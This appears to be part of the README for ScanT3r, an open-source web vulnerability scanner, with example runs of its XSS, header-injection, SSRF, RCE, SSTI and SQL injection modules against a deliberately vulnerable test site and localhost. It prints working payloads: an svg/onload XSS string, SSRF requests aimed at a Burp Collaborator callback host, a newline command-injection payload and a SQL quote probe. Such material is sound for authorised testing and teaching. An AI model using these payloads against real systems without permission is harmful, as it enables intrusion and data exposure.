* xss scan (add your xssht host via -b option)
```bash
$ echo "http://testphp.vulnweb.com/search.php?test=query&searchFor=1&goButton=go" | python3 scant3r.py -m xss

[XSS] Found :> http://testphp.vulnweb.com/search.php
	[!] Method: POST
	[!] Params: test=query&searchFor=1">ScanT3r<svg/onload=confirm(/ScanT3r/)>web"&goButton=go

```
* scan headers with custom payloads and blind xss
add your custom payloads in: `/modules/injheaders/payloads.yaml`
```yaml
# YOUR Payload:
#  - text: match_text (if your match like your payload add 1) # text: 1
#  - regex: match the text with regex?
"\"><svg/onload=alert(1)>": 
    - text: 1
    - regex: false

```

add your custom headers in: `/modules/injheaders/headers.yaml`

```yaml
# YOUR_HEADER: VALUE
"User-agent": "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/125.2 (KHTML, like Gecko) Safari/125.7"
```

* SSRF Scan

```
knassar702@OurPc:~/myproject/scant3r ☭ $ echo 'http://testphp.vulnweb.com/showimage.php?file=' | ./scant3r.py -m ssrf 
                          __ _____     
   ______________ _____  / /|__  /_____
  / ___/ ___/ __ `/ __ \/ __//_ </ ___/
 (__  ) /__/ /_/ / / / / /____/ / /    
/____/\___/\__,_/_/ /_/\__/____/_/ 

[!] Coded by: Khaled Nassar @knassar702
[!] Version: 0.7#Beta

[+] SSRF: http://testphp.vulnweb.com/showimage.php
  Method: GET
  POC: http://testphp.vulnweb.com/showimage.php?file=http://burpcollaborator.net/
---- Request ----

GET http://testphp.vulnweb.com/showimage.php?file=http://burpcollaborator.net/ HTTP/1.1
User-agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive


--------

[+] SSRF: http://testphp.vulnweb.com/showimage.php
  Method: POST
  POC: http://testphp.vulnweb.com/showimage.php?file=http://burpcollaborator.net/
---- Request ----

POST http://testphp.vulnweb.com/showimage.php HTTP/1.1
User-agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
Content-Length: 41
Content-Type: application/x-www-form-urlencoded

file=http%3A%2F%2Fburpcollaborator.net%2F

--------
```

* RCE Scanner
```
knassar702@OurPc:~/myproject/scant3r ☭ $ cat test.txt | ./scant3r.py -m rce
                          __ _____     
   ______________ _____  / /|__  /_____
  / ___/ ___/ __ `/ __ \/ __//_ </ ___/
 (__  ) /__/ /_/ / / / / /____/ / /    
/____/\___/\__,_/_/ /_/\__/____/_/ 

[!] Coded by: Khaled Nassar @knassar702
[!] Version: 0.7#Beta

[+] Remote Code Execution: http://127.0.0.1:5000/
  Method: GET
  payload: %0aid #
  match: gid=
---- Request ----

GET http://127.0.0.1:5000/?name=%0Aid%20 HTTP/1.1
User-agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive


--------
```

* SSTI Scanner

```
$ cat urls.txt | ./scant3r.py -m ssti
```

* Inject XSS payloads in parameters name

```
$ cat urls.txt | ./scant3r.py -m xss_param
```

* find Hidden SSRF Paremters

```
$ cat urls.txt | ./scant3r.py -m lorsrf -x http://blabla.burpcollaborator.net
```

* sqli scanner 

```
$ echo 'http://testphp.vulnweb.com/artists.php?artist=1' | ./scant3r.py -m sqli

knassar702@OurPc:~/myproject/scant3r ☭ $ echo 'http://testphp.vulnweb.com/artists.php?artist=1' | ./scant3r.py -m sqli

   ____              __  ____
  / __/______ ____  / /_|_  /____
 _\ \/ __/ _ `/ _ \/ __//_ </ __/
/___/\__/\_,_/_//_/\__/____/_/

[!] Coded by: Khaled Nassar @knassar702
[!] Version: 0.7#Beta

[SQLI] http://testphp.vulnweb.com/artists.php
	Params: artist=1"
	Method: GET
	Payload: "
	Match: mysql_fetch

```